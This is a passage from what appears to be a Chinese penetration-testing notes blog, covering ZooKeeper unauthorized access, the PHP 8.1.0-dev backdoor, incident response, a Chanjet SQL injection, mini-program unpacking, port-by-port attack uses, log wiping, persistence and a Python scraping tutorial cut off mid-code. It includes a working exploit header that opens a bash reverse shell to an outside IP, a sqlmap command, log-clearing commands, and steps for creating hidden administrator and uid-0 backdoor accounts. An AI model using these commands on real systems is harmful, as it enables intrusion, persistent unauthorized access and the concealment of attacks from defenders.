<p>More info : 该服务默认开放端口2181</p>
<h2 id="漏洞验证：">1.2. 漏洞验证：</h2><p><code>echo envi | nc x.x.x.x 2181</code></p>
<p><img src="https://s2.loli.net/2022/07/04/Ovxwn9J8fBjR1HY.png"></p>
<p>More info : 可利用空间搜索引擎快速判定 zookeeper 服务是存在未授权访问漏洞</p>
<h2 id="漏洞修复：">1.3. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、禁止把Zookeeper直接暴露在公网</span><br><span class="line">2、添加访问控制，根据情况选择对应方式（认证用户，用户名密码）</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>服务器漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>Php8.1backdoor</title>
    <url>/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/PHP/php8.1.html</url>
    <content><![CDATA[<h1 id="PHP8-1后门漏洞">1. PHP8.1后门漏洞</h1><h2 id="影响版本">1.1. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 8.1.0-dev</span><br></pre></td></tr></table></figure>

<h2 id="网络测绘">1.2. 网络测绘:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;PHP/8.1.0-dev&quot;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现">1.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求头增加下列数据</span><br><span class="line">User-Agentt: zerodiumvar_dump(3*7);</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/17/aLZYTRXxgbM38Im.png" alt="image-20220717173108649"></p>
<h2 id="漏洞利用">1.4. 漏洞利用:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求头增加下列数据</span><br><span class="line">User-Agentt: zerodiumsystem(&quot;bash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/192.168.179.129/9999 0&gt;&amp;1&#x27;&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/17/ivMWj4CTebIhfpn.png" alt="image-20220717174749390"></p>
]]></content>
      <categories>
        <category>高级语言</category>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>应急响应</title>
    <url>/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.html</url>
    <content><![CDATA[<h1 id="windows">1. windows</h1><h2 id="查询当前登录系统的会话">1.1. 查询当前登录系统的会话</h2><p><strong>RDP远程连接允许不同的用户同时登录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026125524972.png" alt="image-20221026125524972"></p>
<h2 id="查看本地用户组">1.2. 查看本地用户组</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lusrmgr.msc</span><br><span class="line"></span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">相比于net user,lusrmgr.msc可以看到隐藏用户，而net user不可以</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026113323192.png" alt="image-20221026113323192"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026113822726.png" alt="image-20221026113822726"></p>
<h2 id="查看网络连接">1.3. 查看网络连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看本机所有的tcp,udp端口连接及其对应的pid</span><br><span class="line">netstat -ano	#可用findstr过滤，类似Linux的grep命令</span><br><span class="line"></span><br><span class="line">#打印路由表</span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line">#查看网络代理配置情况</span><br><span class="line">REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure>

<h2 id="检查进程">1.4. 检查进程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#列出所有进程</span><br><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">#强制停止某进程</span><br><span class="line">taskkill /T /F /PID</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026115510214.png" alt="image-20221026115510214"></p>
<h2 id="检查启动项">1.5. 检查启动项</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看系统开机时间</span><br><span class="line">net statistics workstation</span><br><span class="line"></span><br><span class="line">#查看系统计划任务</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line">[at] &amp; [schtasks]</span><br><span class="line">at &lt; Windows2012</span><br><span class="line">schtasks &gt;= Windows2012</span><br><span class="line">#查看程序启动信息</span><br><span class="line">wmic startup get command,caption</span><br><span class="line">msconfig</span><br><span class="line"></span><br><span class="line">win + R services.msc</span><br><span class="line">#查看主机服务信息</span><br><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026120156617.png" alt="image-20221026120156617"></p>
<h2 id="检测目录文件">1.6. 检测目录文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%UserProfile%\Recent</span><br></pre></td></tr></table></figure>

<h2 id="检查浏览器访问记录">1.7. 检查浏览器访问记录</h2><h2 id="杀软工具">1.8. 杀软工具</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">卡巴斯基</span><br><span class="line">火绒-火绒剑</span><br></pre></td></tr></table></figure>

<h2 id="系统日志审计">1.9. 系统日志审计</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eventvwr.msc，也可通过右键计算机管理-事件查看器-windows日志-系统</span><br></pre></td></tr></table></figure>

<p><strong>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义</strong></p>
<table>
<thead>
<tr>
<th align="left">事件ID</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">4624</td>
<td align="left">登录成功</td>
</tr>
<tr>
<td align="left">4625</td>
<td align="left">登录失败</td>
</tr>
<tr>
<td align="left">4634</td>
<td align="left">注销成功</td>
</tr>
<tr>
<td align="left">4647</td>
<td align="left">用户启动的注销</td>
</tr>
<tr>
<td align="left">4672</td>
<td align="left">使用超级用户（如管理员）进行登录</td>
</tr>
<tr>
<td align="left">4720</td>
<td align="left">创建用户</td>
</tr>
</tbody></table>
<h1 id="linux">2. linux</h1><h2 id="账户安全">2.1. 账户安全</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line"></span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"></span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class="line"></span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">usermod -L user    #禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span><br><span class="line">userdel -r user    #将删除user用户，并且将/home目录下的user目录一并删除</span><br></pre></td></tr></table></figure>

<h2 id="查看历史命令">2.2. 查看历史命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /root/.bash_history		查看root的历史命令</span><br><span class="line">cat ~/.bash_history 		查看当前用户的历史命令</span><br></pre></td></tr></table></figure>

<h2 id="检查网络连接">2.3. 检查网络连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">#查看 PID 所对应的进程文件路径</span><br><span class="line">file /proc/$PID/exe</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026132013188.png" alt="image-20221026132013188"></p>
<h2 id="检查进程-1">2.4. 检查进程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top</span><br><span class="line"></span><br><span class="line">ps aux</span><br><span class="line">可用grep进行筛选</span><br><span class="line">ps aux | grep pid</span><br><span class="line"></span><br><span class="line">结束进程</span><br><span class="line">kill -9 PID</span><br></pre></td></tr></table></figure>

<h2 id="检查启动项-1">2.5. 检查启动项</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alt /etc/init.d/</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026133536626.png" alt="image-20221026133536626"></p>
<h2 id="检查定时任务">2.6. 检查定时任务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /var/spool/cron/* </span><br><span class="line">cat /etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line"></span><br><span class="line">#查看目录下所有文件和文件内容</span><br><span class="line">more /etc/cron.d/*</span><br><span class="line"></span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>



<h2 id="检查系统日志">2.7. 检查系统日志</h2><table>
<thead>
<tr>
<th align="center">日志文件</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;cron</td>
<td align="center">记录系统定时任务相关的日志</td>
</tr>
<tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;message</td>
<td align="center">记录Linux操作系统常见的系统和服务错误信息(首要检查对象)</td>
</tr>
<tr>
<td align="center"><code>/var/log/btmp</code></td>
<td align="center">记录错误登录（登陆失败）日志；使用<strong>lastb</strong>命令查看</td>
</tr>
<tr>
<td align="center"><code>/var/log/lastlog</code></td>
<td align="center">记录系统中所有用户最后一次成功登录时间，使用<strong>lastlog</strong>命令查看</td>
</tr>
<tr>
<td align="center"><code>/var/log/wtmp</code></td>
<td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用<strong>last</strong>命令来查看</td>
</tr>
<tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;utmp</td>
<td align="center">只记录<strong>当前登录用户</strong>的信息；使用<strong>w,who,users</strong>等命令来查询</td>
</tr>
<tr>
<td align="center">&#x2F;var&#x2F;log&#x2F;secure</td>
<td align="center">记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码，使用more命令查看</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查询ssh登录记录</span><br><span class="line">more /var/log/secure</span><br><span class="line"></span><br><span class="line">#安装软件的日志-&gt; Centos</span><br><span class="line">/var/log/yum.log</span><br><span class="line">#安装软件的日志-&gt; Ubuntu</span><br><span class="line">/var/log/apt/</span><br></pre></td></tr></table></figure>

<p><strong>&#x2F;var&#x2F;log&#x2F;syslog</strong>：只记录警告信息，常常是系统出问题的信息；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syslog是Linux系统默认的日志守护进程</span><br><span class="line"></span><br><span class="line">默认的syslog配置文件是/etc/sysctl.conf文件</span><br><span class="line"></span><br><span class="line">syslog不可以使用vi等工具直接查看，它是二进制文件，使用 lastlog 查看</span><br></pre></td></tr></table></figure>

<p>默认Centos，Fedora不生成该日志文件，但可以配置让系统生成该日志文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/rsyslog.conf	文件中加上：	*.warning /var/log/syslog</span><br></pre></td></tr></table></figure>

<p>该日志文件能记录当用户登录时login记录下的错误口令、Sendmail的问题、su命令执行失败等信息</p>
<h2 id="查找文件">2.8. 查找文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">按时间查找</span><br><span class="line">find ./ -mtime 0 -name &quot;*.php&quot;</span><br><span class="line">按文件名查找</span><br><span class="line">find / -name *.jsp -perm 777</span><br><span class="line">#找出 ./ 下一天前访问过的文件</span><br><span class="line">find ./ -iname &quot;*&quot; -atime 1 -type f </span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221026134323740.png" alt="image-20221026134323740"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title>畅捷通</title>
    <url>/pages/WEB%E5%BA%94%E7%94%A8/%E7%95%85%E6%8D%B7%E9%80%9A.html</url>
    <content><![CDATA[<h1 id="畅捷通">1. 畅捷通</h1><h2 id="畅捷通前台SQL注入漏洞">1.1. 畅捷通前台SQL注入漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前台管理员的AccountNum参数存在漏洞</span><br><span class="line">下图处抓包</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/08/23/JoqrS3HZMEmUA6W.png" alt="image-20220822235322033_1_.png"></p>
<h2 id="畅捷通未授权访问SQL注入漏洞">1.2. 畅捷通未授权访问SQL注入漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏洞点为如下目录的zt参数</span><br><span class="line">/tplus/UFAQD/KeyInfoList.aspx?preload=1&amp;zt=1	</span><br><span class="line">sqlmap运行参数如下:</span><br><span class="line">sqlmap -u &quot;target_url&quot; -p zt --level 5  --tamper=space2comment --random-agent</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220822235130899.png" alt="image-20220822235130899"></p>
<p><img src="https://s2.loli.net/2022/08/22/lp21JfDZECQw6rq.png" alt="image-20220822234600880"></p>
]]></content>
      <categories>
        <category>WEB应用</category>
      </categories>
  </entry>
  <entry>
    <title>小程序渗透</title>
    <url>/pages/app-%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95.html</url>
    <content><![CDATA[<h1 id="小程序逆向">1. 小程序逆向</h1><ol>
<li><p>工具这里采用<a href="https://github.com/r3x5ur/unveilr">unveilr</a>,使用教程看Github，可以使用单独的可执行文件或者用npm下载配置全局变量。</p>
</li>
<li><p>用户在点击PC端wx小程序时，会在<code>WeChat Files-Applet</code>文件夹下生成一个小程序的包，然后下面找到<code>__APP__.wxapkg</code>文件，该文件为小程序的加密包，无法直接查看。</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416172640749.png" alt="image-20230416172640749"></p>
</li>
<li><p>使用unveilr工具进行解密，<code>.\unveilr@2.0.0-beta.1-win-x64.exe wx &#39;D:\WeChat\WeChat Files\Applet\wx2942736f91a303d6\16\__APP__.wxapkg&#39; -o &#39;E:\Permeation\app&amp;小程序\解包测试\&#39;</code>,成功解密。</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416173909545.png" alt="image-20230416173909545"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416173918906.png" alt="image-20230416173918906"></p>
</li>
<li><p>后续可以通过IDEA或者vscode分析代码中的路由或者敏感信息，貌似IDEA无法正确格式化JS文件，格式化之后依然还是同一行，这里使用vscode的格式化插件prettier进行操作。</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416174238047.png" alt="image-20230416174238047"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416174326587.png" alt="image-20230416174326587"></p>
</li>
<li><p>安装完毕后，点击进入一个js文件，键盘<code>CTRL+ALT+F</code>,会弹出窗口提示是使用插件的格式化或者是默认的格式化功能，这里选插件的，完成后就会如下图所示，成功换行。</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416174501254.png" alt="image-20230416174501254"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>app&amp;小程序</category>
      </categories>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/pages/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html</url>
    <content><![CDATA[<h1 id="常见端口默认服务">1. 常见端口默认服务</h1><table>
<thead>
<tr>
<th>端口 (默认)</th>
<th><strong>服务</strong></th>
<th align="left"><strong>渗透用途</strong></th>
</tr>
</thead>
<tbody><tr>
<td>tcp 20,21</td>
<td>FTP</td>
<td align="left">允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp  2.3.4)</td>
</tr>
<tr>
<td>tcp 22</td>
<td>SSH</td>
<td align="left">可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等</td>
</tr>
<tr>
<td>tcp 23</td>
<td>Telnet</td>
<td align="left">爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令</td>
</tr>
<tr>
<td>tcp 110</td>
<td>POP3</td>
<td align="left">可尝试爆破,嗅探</td>
</tr>
<tr>
<td>tcp 111,2049</td>
<td>NFS</td>
<td align="left">权限配置不当</td>
</tr>
<tr>
<td>tcp 137,139,445</td>
<td>Samba</td>
<td align="left">可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td>
</tr>
<tr>
<td>tcp 143</td>
<td>IMAP</td>
<td align="left">可尝试爆破</td>
</tr>
<tr>
<td>udp 161</td>
<td>SNMP</td>
<td align="left">爆破默认团队字符串,搜集目标内网信息</td>
</tr>
<tr>
<td>tcp 389</td>
<td>LDAP</td>
<td align="left">ldap注入,允许匿名访问,弱口令</td>
</tr>
<tr>
<td>tcp 512,513,514</td>
<td>Linux rexec</td>
<td align="left">可爆破,rlogin登陆</td>
</tr>
<tr>
<td>tcp 873</td>
<td>Rsync</td>
<td align="left">匿名访问,文件上传</td>
</tr>
<tr>
<td>tcp 1194</td>
<td>OpenVPN</td>
<td align="left">想办法钓VPN账号,进内网</td>
</tr>
<tr>
<td>tcp 1352</td>
<td>Lotus</td>
<td align="left">弱口令,信息泄漏,爆破</td>
</tr>
<tr>
<td>tcp 1433</td>
<td>SQL Server</td>
<td align="left">注入,提权,sa弱口令,爆破</td>
</tr>
<tr>
<td>tcp 1521</td>
<td>Oracle</td>
<td align="left">tns爆破,注入,弹shell…</td>
</tr>
<tr>
<td>tcp 1500</td>
<td>ISPmanager</td>
<td align="left">弱口令</td>
</tr>
<tr>
<td>tcp 1723</td>
<td>PPTP</td>
<td align="left">爆破,想办法钓VPN账号,进内网</td>
</tr>
<tr>
<td>tcp 2082,2083</td>
<td>cPanel</td>
<td align="left">弱口令</td>
</tr>
<tr>
<td>tcp 2181</td>
<td>ZooKeeper</td>
<td align="left">未授权访问</td>
</tr>
<tr>
<td>tcp 2601,2604</td>
<td>Zebra</td>
<td align="left">默认密码zerbra</td>
</tr>
<tr>
<td>tcp 3128</td>
<td>Squid</td>
<td align="left">弱口令</td>
</tr>
<tr>
<td>tcp 3312,3311</td>
<td>kangle</td>
<td align="left">弱口令</td>
</tr>
<tr>
<td>tcp 3306</td>
<td>MySQL</td>
<td align="left">注入,提权,爆破</td>
</tr>
<tr>
<td>tcp 3389</td>
<td>Windows rdp</td>
<td align="left">shift后门[需要03以下的系统],爆破,ms12-020</td>
</tr>
<tr>
<td>tcp 3690</td>
<td>SVN</td>
<td align="left">svn泄露,未授权访问</td>
</tr>
<tr>
<td>tcp 4848</td>
<td>GlassFish</td>
<td align="left">弱口令</td>
</tr>
<tr>
<td>tcp 5000</td>
<td>Sybase&#x2F;DB2</td>
<td align="left">爆破,注入</td>
</tr>
<tr>
<td>tcp 5432</td>
<td>PostgreSQL</td>
<td align="left">爆破,注入,弱口令</td>
</tr>
<tr>
<td>tcp 5900,5901,5902</td>
<td>VNC</td>
<td align="left">弱口令爆破、未授权访问</td>
</tr>
<tr>
<td>tcp 5984</td>
<td>CouchDB</td>
<td align="left">未授权导致的任意指令执行</td>
</tr>
<tr>
<td>tcp 6379</td>
<td>Redis</td>
<td align="left">可尝试未授权访问,弱口令爆破</td>
</tr>
<tr>
<td>tcp 7001,7002</td>
<td>WebLogic</td>
<td align="left">Java反序列化,弱口令</td>
</tr>
<tr>
<td>tcp 7778</td>
<td>Kloxo</td>
<td align="left">主机面板登录</td>
</tr>
<tr>
<td>tcp 8000</td>
<td>Ajenti</td>
<td align="left">弱口令</td>
</tr>
<tr>
<td>tcp 8443</td>
<td>Plesk</td>
<td align="left">弱口令</td>
</tr>
<tr>
<td>tcp 8069</td>
<td>Zabbix</td>
<td align="left">远程执行,SQL注入</td>
</tr>
<tr>
<td>tcp 8080-8089</td>
<td>Jenkins,JBoss</td>
<td align="left">反序列化,控制台弱口令</td>
</tr>
<tr>
<td>Tcp 9080-9081,9090</td>
<td>WebSphere</td>
<td align="left">Java反序列化&#x2F;弱口令</td>
</tr>
<tr>
<td>tcp 9200,9300</td>
<td>ElasticSearch</td>
<td align="left">未授权访问、远程代码执行</td>
</tr>
<tr>
<td>tcp 11211</td>
<td>Memcached</td>
<td align="left">未授权访问</td>
</tr>
<tr>
<td>tcp 27017,27018</td>
<td>MongoDB</td>
<td align="left">爆破,未授权访问</td>
</tr>
<tr>
<td>tcp 50070,50030</td>
<td>Hadoop</td>
<td align="left">默认端口未授权访问</td>
</tr>
</tbody></table>
<h2 id="目录扫描">1.1. 目录扫描</h2><p><code>可以通过dirsearch、御剑、burp等工具进行爆破目录，从而查看是否存在一些敏感信息页面，进行下一步攻击</code></p>
<h2 id="子域名收集">1.2. 子域名收集</h2><p><code>可以通过Layer子域名挖掘机、google语法、空间搜索引擎去获得子域名信息</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空间搜索引擎:</span><br><span class="line">https://fofa.info/</span><br><span class="line">https://hunter.qianxin.com/</span><br><span class="line">https://www.shodan.io/</span><br><span class="line">https://www.zoomeye.org/</span><br><span class="line">https://quake.360.cn/quake/#/index</span><br></pre></td></tr></table></figure>

<h2 id="备案查询">1.3. 备案查询</h2><p>输入主域名查询域名备案信息，输入公司名称则查询公司备案域名</p>
<p><img src="https://s2.loli.net/2022/07/07/xXOdKqbTk7ALInQ.png" alt="image-20220707141335587"></p>
<h2 id="IP反查or域名反查">1.4. IP反查or域名反查</h2><p><img src="https://s2.loli.net/2022/07/07/Sc4M6EgP5QTnCyp.png" alt="image-20220707142435837"></p>
<h2 id="威胁情报查询">1.5. 威胁情报查询</h2><p>主要是查询IP是否存在威胁，也可以查看是否存在域名，以及端口开放情况等信息</p>
<p><img src="https://s2.loli.net/2022/07/07/ZYnBCtAXFdHJxQf.png" alt="image-20220707142654422"></p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
  </entry>
  <entry>
    <title>痕迹清除</title>
    <url>/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4.html</url>
    <content><![CDATA[<p>痕迹清除</p>
<p>windows</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/mAeIuY1lChFbxoR.png" alt="image-20220804073428642"></p>
<p>linux</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &gt; /var/log/syslog  // 清除系统日志</span><br><span class="line"></span><br><span class="line">echo &gt; /var/log/wtmp  // 清除用户登录日志</span><br><span class="line"></span><br><span class="line">history -c  // 清除history痕迹</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title>权限维持</title>
    <url>/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html</url>
    <content><![CDATA[<h1 id="权限维持">1. 权限维持</h1><h2 id="windows">1.1. windows</h2><h3 id="添加隐藏用户">1.1.1. 添加隐藏用户</h3><ol>
<li><code>net user Guest01$ Aa123456. /add</code></li>
<li><code>net user</code>查看用户，未发现<code>Guest01$</code>用户</li>
<li>通过<code>计算机管理--&gt;本地用户和组--&gt;用户</code>  可以看到用户</li>
</ol>
<h3 id="开启远程桌面功能">1.1.2. 开启远程桌面功能</h3><ol>
<li><p><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code> 开启3389远程桌面功能</p>
</li>
<li><p><code>net localgroup Administrators Guest01$ /add </code> 将Guest01$账号添加到管理员组，不然登录会出现没有权限</p>
<p><img src="https://s2.loli.net/2022/08/15/e9g7Thxp6tVPvsd.png" alt="image-20220815150935477"></p>
<p>3.CS木马上线，将木马进程注入到现有进程中。</p>
</li>
</ol>
<h2 id="linux">1.2. linux</h2><h3 id="一句话新建用户，并加入管理员组">1.2.1. 一句话新建用户，并加入管理员组</h3><p><code>useradd -p openssl passwd -1 -salt &#39;qax&#39; qaxnb@123 -u 0 -g root -G root -s /bin/bash -d /usr/bin/qaxnb qaxnb</code></p>
<p>（最后的qaxnb为账号,qaxnb@123为密码）</p>
<p>添加ssh公钥</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title>爬虫</title>
    <url>/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/Python/Python%E7%88%AC%E8%99%AB.html</url>
    <content><![CDATA[<h1 id="python爬虫">1. python爬虫</h1><p><a href="https://www.bilibili.com/video/BV1ZT4y1d7JM?p=1">python爬虫视频链接</a></p>
<h2 id="Requests">1.1. Requests</h2><h3 id="GET">1.1.1. GET</h3><h4 id="基础介绍">1.1.1.1. 基础介绍</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">query = <span class="built_in">input</span>(<span class="string">&quot;请输入你要搜索的内容&quot;</span>)</span><br><span class="line"><span class="comment">#将url的某个参数作为变量去控制</span></span><br><span class="line">url = <span class="string">f&quot;https://www.sogou.com/web?query=<span class="subst">&#123;query&#125;</span>&quot;</span></span><br><span class="line"><span class="comment">#获取网页源码</span></span><br><span class="line">html = requests.get(url,headers=headers)</span><br><span class="line"><span class="comment">#设置字符格式</span></span><br><span class="line">response = html.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line"><span class="comment">#将进程关闭</span></span><br><span class="line">html.close()</span><br></pre></td></tr></table></figure>

<h4 id="案例-抓取豆瓣电影喜剧排行前20排行榜">1.1.1.2. 案例:抓取豆瓣电影喜剧排行前20排行榜</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/j/chart/top_list&quot;</span></span><br><span class="line"><span class="comment">#parmams是重新封装参数</span></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;interval_id&quot;</span>: <span class="string">&quot;100:90&quot;</span>,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;start&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;limit&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.get(url,params=params,headers=headers)<span class="comment">#params可以拼接URL</span></span><br><span class="line"><span class="built_in">print</span>(res.json())</span><br><span class="line">res.close()</span><br></pre></td></tr></table></figure>


<h3 id="Json">1.1.2. Json</h3><h4 id="基础介绍-1">1.1.2.1. 基础介绍</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">json----轻量级的文本数据交换格式</span><br><span class="line">用法：&#123;</span><br><span class="line">json.dumps():对数据进行编码，将字典转换成字符串</span><br><span class="line">json.loads():对数据进行解码，将字符串转为字典</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="案例">1.1.2.2. 案例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;no&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>:<span class="string">&quot;baidu&quot;</span>,</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://www.baidu.com&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">json_str = json.dumps(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;python原数据格式为：<span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;json数据格式为：<span 